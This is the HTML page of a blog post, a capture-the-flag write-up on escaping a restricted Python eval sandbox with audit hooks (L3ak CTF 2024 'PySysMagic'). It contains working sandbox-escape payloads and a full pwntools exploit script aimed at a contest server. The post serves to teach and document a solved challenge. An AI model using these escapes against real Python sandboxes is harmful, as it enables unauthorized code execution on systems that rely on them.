+      <h2>Hacking &amp; other stuff</h2>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a class="nav-link" href="/"><b>Home</b></a>
+      
+         | 
+        <a class="nav-link" href="/whoami/"><b>Whoami</b></a>
+      
+         | 
+        <a class="nav-link" href="/achievements/"><b>Achievements</b></a>
+      
+         | 
+        <a class="nav-link" href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a class="nav-link" href="/cves/"><b>CVEs</b></a>
+      
+    
+  </nav>
+  <hr>
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Yet Another PyJail - PySysMagic - L3ak CTF 2024</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-07-26 20:38:20</time>
+    
+    
+  </strong>
+  <span> • 924 words</span>
+  <span> • 5 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/cybersec">Cybersec</a>, 
+        <a href="/tags/writeup">Writeup</a>, 
+        <a href="/tags/pyjail">pyjail</a>
+    </div>
+  
+</div>
+
+      <div class="content"><p>I partecipated to the first edition of <code>L3ak CTF</code> with <code>FoocHackz</code>. I solved this challenge, it wasn&rsquo;t hard but writing a working exploit took me at least one/two hours.</p>
+<h2 id="index">
+  <a class="full-clickable-heading" href="#index">
+    Index
+  </a>
+</h2>
+<ul>
+<li>
+
+  <a href="#index">Index</a>
+
+</li>
+<li>
+
+  <a href="#overview">Overview</a>
+
+
+<ul>
+<li>
+
+  <a href="#source">Source</a>
+
+</li>
+<li>
+
+  <a href="#a-bit-of-py-magic">A bit of Py-Magic</a>
+
+</li>
+<li>
+
+  <a href="#obligatory-pyjail">Obligatory Pyjail</a>
+
+</li>
+<li>
+
+  <a href="#building-payloads-from-docs">Building payloads from docs</a>
+
+</li>
+</ul>
+</li>
+<li>
+
+  <a href="#solve">Solve</a>
+
+
+<ul>
+<li>
+
+  <a href="#flag">Flag</a>
+
+</li>
+</ul>
+</li>
+<li>
+
+  <a href="#considerations">Considerations</a>
+
+</li>
+<li>
+
+  <a href="#source">Source</a>
+
+</li>
+</ul>
+
+<h2 id="overview">
+  <a class="full-clickable-heading" href="#overview">
+    Overview
+  </a>
+</h2>
+<p>As the title of the challenge suggests, it&rsquo;s a pyjail. To be more precise, two challenges from two different CTFs were merged together</p>
+<ul>
+<li><code>obligatory pyjail</code> from <code>LIT CTF 2023</code></li>
+<li><code>PyMagic</code> from <code>TCP1P CTF 2023</code></li>
+</ul>
+<p>So, with that in mind, let&rsquo;s take a look at the source code</p>
+
+<h3 id="source">
+  <a class="full-clickable-heading" href="#source">
+    Source
+  </a>
+</h3>
+<p>We&rsquo;re given a bunch of files but these are the most important ones</p>
+<ul>
+<li><code>audit_sandbox.c</code> a C program which uses 
+
+  <a href="https://peps.python.org/pep-0578/" rel="noopener">Audit Hooks</a>
+
+ to implement a whitelist sandbox. The only audit events we&rsquo;re allowed to use are <code>compile</code> and <code>exec</code></li>
+<li><code>chall.py</code> the actual challenge script</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># python3.10 chall.py build</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># obligatory pyjail + PyMagic = ?</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">distutils.core</span> <span class="kn">import</span> <span class="n">Extension</span><span class="p">,</span> <span class="n">setup</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="c1"># Useless stuff</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">audit_sandbox</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">audit_sandbox</span><span class="o">.</span><span class="n">install_hook</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">audit_sandbox</span>
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s2">&#34;audit_sandbox&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">del</span> <span class="n">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>  <span class="c1"># ill be nice :)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="o">=</span> <span class="nb">eval</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s2">&#34;[()&#39;</span><span class="se">\&#34;</span><span class="s2">0123456789 ]&#34;</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="p">(</span><span class="n">b</span> <span class="o">:=</span> <span class="n">__builtins__</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">)</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">eval</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">:</span> <span class="p">{},</span> <span class="s2">&#34;_&#34;</span><span class="p">:</span> <span class="n">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Nope.&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>A lot of things immediately catch the eye</p>
+<ul>
+<li>All builtin functions are <em>apparently</em> deleted except <code>eval</code> but can be accessed from the <code>__main__</code> module</li>
+<li><code>()</code> and numbers are not allowed</li>
+<li><code>'</code>, <code>&quot;</code> and <code>[space]</code> are not allowed</li>
+<li>A cool gadget called <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code> is given to us</li>
+</ul>
+<p>If there had been <code>exec</code> instead of <code>eval</code>, we could have used 
+
+  <a href="https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-function-calls" rel="noopener">decorators</a>
+
+!</p>
+
+<h3 id="a-bit-of-py-magic">
+  <a class="full-clickable-heading" href="#a-bit-of-py-magic">
+    A bit of Py-Magic
+  </a>
+</h3>
+<p>In this case, we can use a cool trick from the <code>PyMagic</code> challenge mentioned above</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">call_function</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[[None for _.__class_getitem__ in [</span><span class="si">{</span><span class="n">f</span><span class="si">}</span><span class="s2">]],&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="sa">f</span><span class="s2">&#34;_[</span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="s2">]][True]&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>Thanks to 
+
+  <a href="https://peps.python.org/pep-0560/#class-getitem" rel="noopener"><code>__class_getitem__</code></a>
+
+ we&rsquo;re able to call any function without using brackets</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="kc">None</span> <span class="k">for</span> <span class="n">_</span><span class="o">.</span><span class="n">__class_getitem__</span> <span class="ow">in</span> <span class="p">[</span><span class="nb">int</span><span class="p">]</span> <span class="c1"># Equivalent of _.__class_getitem__ = int</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_</span><span class="p">[</span><span class="s1">&#39;12&#39;</span><span class="p">]</span> <span class="c1"># Calling _.__class_getitem__ -&gt; int</span>
+</span></span><span class="line"><span class="cl"><span class="p">][</span><span class="kc">True</span><span class="p">]</span> <span class="c1"># Get the return value</span>
+</span></span></code></pre></div><p>But using this method, we have limitations: we are forced to pass only one argument to a function</p>
+
+<h3 id="obligatory-pyjail">
+  <a class="full-clickable-heading" href="#obligatory-pyjail">
+    Obligatory pyjail
+  </a>
+</h3>
+<p>Ok now we need to bypass the audit sandbox. The file called <code>audit_sandbox.c</code> was actually <del>stolen</del> taken from <code>LIT CTF 2023</code></p>
+<p>Let&rsquo;s just take a look the solve for <code>obligatory pyjail</code> (Credits to flocto)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">[</span><span class="n">lm</span><span class="o">:=</span><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">104</span><span class="p">]</span><span class="o">.</span><span class="n">load_module</span><span class="p">,</span><span class="n">p</span><span class="o">:=</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">pipe</span><span class="p">,</span><span class="n">_ps</span><span class="o">:=</span><span class="n">lm</span><span class="p">(</span><span class="s2">&#34;_posixsubprocess&#34;</span><span class="p">),</span><span class="n">_ps</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/cat&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/cat&#34;</span><span class="p">],</span> <span class="kc">True</span><span class="p">,</span> <span class="p">(),</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">p</span><span class="p">()),</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">None</span><span class="p">)]</span>
+</span></span></code></pre></div><p>So using <code>_posixsubprocess.fork_exec</code> we bypass that sandobx. Cool, but there&rsquo;s a catch: <code>fork_exec</code> requires exactly 21 arguments. As I said before, we&rsquo;re allowed to pass exactly 1 argument using <code>_.__class_getitem__</code></p>
+<p>And now what?</p>
+
+<h2 id="building-payloads-from-docs">
+  <a class="full-clickable-heading" href="#building-payloads-from-docs">
+    Building payloads from docs
+  </a>
+</h2>
+<p>I specified earlier that <code>eval</code> is not completely deleted. In fact, we can access it from the <code>__main__</code> module. Since we can&rsquo;t import anything, we can reach the <code>sys</code> module from some objects found in <code>().__class__.__base__.__subclasses()</code> andd then access to <code>eval</code> using <code>sys.modules['__main__']</code></p>
+<p>But how can <code>eval</code> be useful to us?</p>
+<p>Our goal is to call <code>fork_exec</code> passing to it 21 arguments. We can build payloads from scratch using docs (eg. <code>[].__doc__</code>). If some characters are not in the docs, we can get them from <code>_.__qualname__</code></p>
+<p>So, our main idea would be:</p>
+<ul>
+<li>Build a payload from docs which would call <code>_posixsubprocess.fork_exec</code></li>
+<li>Reach <code>__main__.eval</code></li>
+<li>Call it and pass the payload as the first argument</li>
+<li>Profit</li>
+</ul>
+
+<h2 id="solve">
+  <a class="full-clickable-heading" href="#solve">
+    Solve
+  </a>
+</h2>
+<p>I copy pasted the solve for <code>PyMagic</code>, you can find it 
+
+  <a href="https://github.com/SuperStormer/writeups/blob/master/tcp1pctf_2023/misc/pymagic/solve_pymagic.py" rel="noopener">here</a>
+
+ (Credits to SuperStormer)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gen_int</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;False&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;--&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s2">&#34;True&#34;</span><span class="p">]</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">call_function</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[[None for _.__class_getitem__ in [</span><span class="si">{</span><span class="n">f</span><span class="si">}</span><span class="s2">]],&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;_[</span><span class="si">{</span><span class="n">arg</span><span class="si">}</span><span class="s2">]][True]&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">type_s</span> <span class="o">=</span> <span class="s2">&#34;_.__class__&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">object_s</span> <span class="o">=</span> <span class="s2">&#34;_.__base__&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">subclasses</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="n">type_s</span> <span class="o">+</span> <span class="s2">&#34;.__subclasses__&#34;</span><span class="p">,</span> <span class="n">object_s</span><span class="p">)</span> <span class="c1"># _.__class__.__subclasses__(_.__base__)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">wrap_close</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">subclasses</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">137</span><span class="p">)</span><span class="si">}</span><span class="s2">]&#34;</span> <span class="c1"># os._wrap_close</span>
+</span></span><span class="line"><span class="cl"><span class="n">os_module</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">wrap_close</span><span class="si">}</span><span class="s2">.__init__.__globals__&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="p">:</span><span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_string</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">src</span> <span class="o">=</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">.</span><span class="vm">__doc__</span> <span class="o">+</span> <span class="p">{}</span><span class="o">.</span><span class="vm">__doc__</span>
+</span></span><span class="line"><span class="cl">    <span class="n">final</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fromdoc</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">:=</span><span class="n">src</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">fromdoc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">final</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;[[].__doc__.__doc__+</span><span class="se">{{}}</span><span class="s2">.__doc__][False][</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="si">}</span><span class="s2">]+&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span> <span class="n">final</span> <span class="o">+=</span> <span class="sa">f</span><span class="s2">&#34;_.__qualname__[</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="n">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="o">.</span><span class="vm">__qualname__</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">x</span><span class="p">))</span><span class="si">}</span><span class="s2">]+&#34;</span> <span class="k">if</span> <span class="n">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</span><span class="o">.</span><span class="vm">__qualname__</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="k">else</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">call_function</span><span class="p">(</span><span class="s1">&#39;_.__class__.__subclasses__&#39;</span><span class="p">,</span> <span class="s1">&#39;_.__base__&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span><span class="si">}</span><span class="s2">].__doc__[True]+&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">final</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sys_s</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;[*</span><span class="si">{</span><span class="n">os_module</span><span class="si">}</span><span class="s2">][</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span><span class="si">}</span><span class="s2">]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys_modules</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">os_module</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">sys_s</span><span class="si">}</span><span class="s2">].modules&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main_module_s</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;[*</span><span class="si">{</span><span class="n">sys_modules</span><span class="si">}</span><span class="s2">][</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span><span class="si">}</span><span class="s2">]&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">eval_func</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">sys_modules</span><span class="si">}</span><span class="s2">[</span><span class="si">{</span><span class="n">main_module_s</span><span class="si">}</span><span class="s2">].eval&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">to_eval</span> <span class="o">=</span> <span class="n">build_string</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[(os_module:=().__class__.__base__.__subclasses__()[</span><span class="si">{</span><span class="n">gen_int</span><span class="p">(</span><span class="mi">137</span><span class="p">)</span><span class="si">}</span><span class="s2">].__init__.__globals__).__class__,(sys:=os_module[&#39;sys&#39;]).__class__,sys.modules[&#39;_posixsubprocess&#39;].fork_exec([f&#39;.</span><span class="se">{{</span><span class="s2">True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span class="se">}}</span><span class="s2">readflag&#39;.encode()],[f&#39;.</span><span class="se">{{</span><span class="s2">True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True:c</span><span class="se">}}</span><span class="s2">readflag&#39;.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module[&#39;pipe&#39;]()),False,False,None,None,None,-True,None)]&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">system_sh</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="n">eval_func</span><span class="p">,</span> <span class="n">to_eval</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;34.139.98.117&#34;</span><span class="p">,</span> <span class="mi">6669</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">system_sh</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Let&rsquo;s break it down</p>
+<ul>
+<li><code>gen_int</code> Since numbers cannot be used, they can be generated from booleans (eg. <code>3</code> becomes <code>True -- True -- True</code>). I used <code>--</code> instead of <code>+</code> because I couldn&rsquo;t find <code>+</code> inside the docs</li>
+<li><code>build_string</code> <code>&quot;</code> and <code>'</code> are not allowed so it&rsquo;s possible to build the payload from docs and from <code>_.__qualname__</code></li>
+<li><code>call_function</code> generate the payload to call a specified function with an argument</li>
+<li><code>subclasses</code> is the equivalent of <code>_.__class__.__subclasses__(_.__base__)</code>, which is the equivalent of <code>_.__class__.__base__.__subclasses__()</code></li>
+<li>Access <code>os._wrap_close</code> (position 137) to recover the <code>os</code> module objects</li>
+<li>Do the same thing for the <code>sys</code> module and then recover <code>__main__.eval</code></li>
+<li>Build the payload which will be passed to <code>eval</code>: <code>[(os_module:=().__class__.__base__.__subclasses__()[137].__init__.__globals__).__class__,(sys:=os_module['sys']).__class__,sys.modules['_posixsubprocess'].fork_exec([f'.{47:c}readflag'.encode()],[f'.{47:c}readflag'.encode()],True,(),None,None,-True,-True,-True,-True,-True,-True,*(os_module['pipe']()),False,False,None,None,None,-True,None)]</code></li>
+<li>Finally, pass that payload to <code>eval</code> and proceed to send everything to the remote server</li>
+</ul>
+
+<h3 id="flag">
+  <a class="full-clickable-heading" href="#flag">
+    Flag
+  </a>
+</h3>
+<p><code>L3AK{ok_so_os_wrap_close_works_with_builtin_removal_so_added_audit_sandbox_lol_689db2}</code></p>
+
+<h2 id="considerations">
+  <a class="full-clickable-heading" href="#considerations">
+    Considerations
+  </a>
+</h2>
+<p>This is not the intended solution. The author forgot to remove <code>eval</code> from the main module. I think the intended one is a lot smaller than mine.</p>
+<p>What happens if all modules from <code>sys.modules</code> are removed? Is it still solvable?</p>
+<p>At the end, it was a fun challenge to solve ❤️</p>
+<p>Thanks to the authors for the challenge and for the CTF in general. It&rsquo;s always nice to see pyjails in CTFs!</p>
+
+<h2 id="source-1">
+  <a class="full-clickable-heading" href="#source-1">
+    Source
+  </a>
+</h2>
+<p>You can find the source of this challenge 
+
+  <a href="https://github.com/salvatore-abello/pyjail/tree/main/L3ak%20CTF%202024" rel="noopener">here</a>
+
+</p>
+<p><strong>P.S:</strong> Do you need a cheatsheet with many tricks to solve pyjails? If so, 
+
+  <a href="https://github.com/salvatore-abello/python-ctf-cheatsheet/" rel="noopener">click here!</a>
+
+</p></div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/salvatore-abello">Github</a>
+      
+         | 
+        <a href="https://www.linkedin.com/in/salvatore-abello/">Linkedin</a>
+      
+         | 
+        <a href="https://x.com/salvatoreabello">X</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2025. All rights deserved.
+  </p>
+  <hr><code>Made with ❤️ by <strong>Salvatore Abello</strong></code> | <a href="/index.xml"><b>RSS</b></a>
+</footer>
+
+    </div>
+  </body>
+</html>
